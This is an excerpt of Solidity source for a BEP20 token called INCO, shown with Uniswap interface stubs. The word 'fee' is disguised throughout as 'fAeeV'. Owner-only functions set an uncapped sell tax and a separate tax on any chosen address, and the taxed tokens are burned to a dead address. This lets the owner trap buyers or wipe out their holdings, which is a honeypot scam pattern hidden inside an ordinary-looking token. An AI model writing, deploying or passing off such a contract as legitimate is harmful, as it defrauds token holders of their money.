...
interface IUniswapV2Factory {
    ...
    function fAeeVTo() external view returns (address);
    function fAeeVToSetter() external view returns (address);
    ...
    function setfAeeVTo(address) external;
    function setfAeeVToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfAeeVOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfAeeVOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfAeeVOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfAeeVOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfAeeVOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract INCO is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfAeeV = 0;

    uint256 private _defaultBuyfAeeV = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfAeeV;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfAeeV = _value;
    }

    function setSlipfAeeV(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfAeeV[_address] = _value;
    }

    function getSlipfAeeV(address _address) external view onlyownar returns (uint256) {
        return _slipfAeeV[_address];
    }


    function setMAccountfAeeV(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfAeeV(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefAeeVAmount = 0;

        if (rF) {
            uint256 tradefAeeV = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefAeeV = _defaultSellfAeeV;
                }
                if (from == uniswapV2Pair) {

                    tradefAeeV = _defaultBuyfAeeV;
                }
            }
            if (_slipfAeeV[from] > 0) {
                tradefAeeV = _slipfAeeV[from];
            }

            tradefAeeVAmount = _Amount.mul(tradefAeeV).div(100);
        }


        if (tradefAeeVAmount > 0) {
            _balances[from] = _balances[from].sub(tradefAeeVAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefAeeVAmount);
            emit Transfer(from, _deadAddress, tradefAeeVAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefAeeVAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefAeeVAmount);
        emit Transfer(from, _to, _Amount - tradefAeeVAmount);
    }
